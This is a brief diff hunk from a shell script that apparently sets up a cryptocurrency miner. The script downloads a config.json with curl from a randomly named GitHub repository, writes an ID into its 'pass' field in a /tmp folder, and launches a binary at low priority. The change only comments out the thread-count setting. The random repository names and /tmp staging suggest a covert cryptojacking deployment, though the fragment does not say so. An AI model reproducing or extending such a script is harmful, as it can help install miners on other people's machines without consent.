@@ -51,7 +51,7 @@ if ! curl -L "https://raw.githubusercontent.com/ohch6Ong/EeXah6Bi/main/config.js
 fi
 
 sed -i 's/"pass": *"[^"]*",/"pass": "'$ID'",/' /tmp/$FOLDER/config.json
-sed -i 's/"max-threads-hint": *[^,]*,/"max-threads-hint": '$CPU',/' /tmp/$FOLDER/config.json
+#sed -i 's/"max-threads-hint": *[^,]*,/"max-threads-hint": '$CPU',/' /tmp/$FOLDER/config.json
 
 nice $HOME/bin/$NAME
 
